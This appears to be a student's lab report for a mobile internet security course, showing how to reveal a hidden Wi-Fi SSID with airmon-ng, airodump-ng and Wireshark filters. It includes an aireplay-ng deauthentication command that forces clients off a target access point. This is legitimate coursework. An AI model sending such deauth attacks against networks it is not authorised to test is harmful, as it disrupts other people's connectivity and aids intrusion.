---
title: 2024移动互联网安全作业chap0x02
description: 探测隐藏SSID
slug: misChap0x02
date: 2024-03-25 16:00:00+0800
image: img/gitlab.png
categories:
    - cucStudy
tags:
    - VMware
    - linux
    - kali
    - ComputerNetworkSecurity
#weight: 1       # You can add weight to some posts to override the default sorting (date descending)
comments: true

#license: flase
#math: true
#toc: true
#style: 
#keywords:
#readingTime:
links:
  - title: 移动互联完全chap0x02
    description: 2024移动互联网安全作业仓库chap0x02
    website: https://git.cuc.edu.cn/ccs/2024-mobile-internet-security/liduoyang/-/tree/chap0x02
    image: /gitlab.png

  - title: 移动互联完全在线课本
    description: 这是一本试水互联网+高等教育的开放编辑电子版教材，作者本人从2014年起在中国传媒大学计算机学院面向信息安全专业本科生讲授《移动互联网安全》这门课程。
    website: https://c4pr1c3.github.io/cuc-mis/
    image: /gitlab.png

---
# 实验二

## 实验任务

- 发现隐藏SSID


## 实验环境

- VMware® Workstation 17 Pro 17.5.1 build-23298084
- kali-linux-2024.1-vmware-amd64

## 实验步骤

#### 发现隐藏SSID

1. 配置网卡进入监听模式

`sudo airmon-ng start wlan0`

2. 开始抓包发现wifi

`sudo airodump-ng wlan0mon`

![airodump-ng](img/airodump-ng.png)

3. 指定信道抓包

`sudo airodump-ng wlan0mon-c 6 -w saved --beacons`

![airodump-ng-c](img/airodump-ng-c.png)

4. 发送解除认证广播包

`sudo aireplay-ng --deauth 1 -a [BSSID] wlan0mon --ignore-negative-one`

![aireplay-ng](img/aireplay-ng.png)

5. 查看隐藏SSID

`sudo airodump-ng wlan0mon-c 6 -w saved --beacons`

![airodump-ng-c-find](img/airodump-ng-c-find.png)

#### 思考题

1. 分析捕获到的数据包，查找⽬标隐藏 SSID 5C:02:14:75:2A:18 发出的所
有 Beacon 报⽂，并查看报⽂中 SSID 字段设置。请给出对应的 Wireshark
过滤语法及截图。

- `wlan.bssid ==  5C:02:14:75:2A:18 && wlan.fc.type_subtype == 0x08`

SSID 字段为 Wildcard(Broadcast) 和 A

![wireshark_1](img/wireshark_1.png)



2. 分析捕获到的数据包，查找哪些报⽂中包含了隐藏 SSID
5C:02:14:75:2A:18 的 ESSID 名称？请给出任意⼀条报⽂的编号、报⽂的
802.11 协议帧类型。请给出对应的 Wireshark 过滤语法及截图。

- `wlan.bssid ==  5C:02:14:75:2A:18 && wlan.ssid == "A"`

![wireshark_2](img/wireshark_2.png)

- 报文编号:1335
- 802.11 协议帧类型:Probe Response


## 实验问题以及解决方法

1. aireplay-ng 无法发送解除认证广播包，信道错误

```bash
└─$ sudo aireplay-ng --deauth 1 -a  5C:02:14:75:2A:18 wlan0mon --ignore-negative-one
03:18:50  Waiting for beacon frame (BSSID: 5C:02:14:75:2A:18) on channel 7
03:19:00  No such BSSID available.
```

- 解决:

发现隐藏SSID关键在于捕获目标AP和其关联客户端的无线数据包,并通过解除认证攻击等手段触发重新连接过程。

开两个终端，一个指定信道抓包，一个用于发送解除认证广播包 即可结局



## 参考链接

- [移动互联网安全 在线课本](https://c4pr1c3.github.io/cuc-mis/)
- [claude.ai](https://claude.ai/)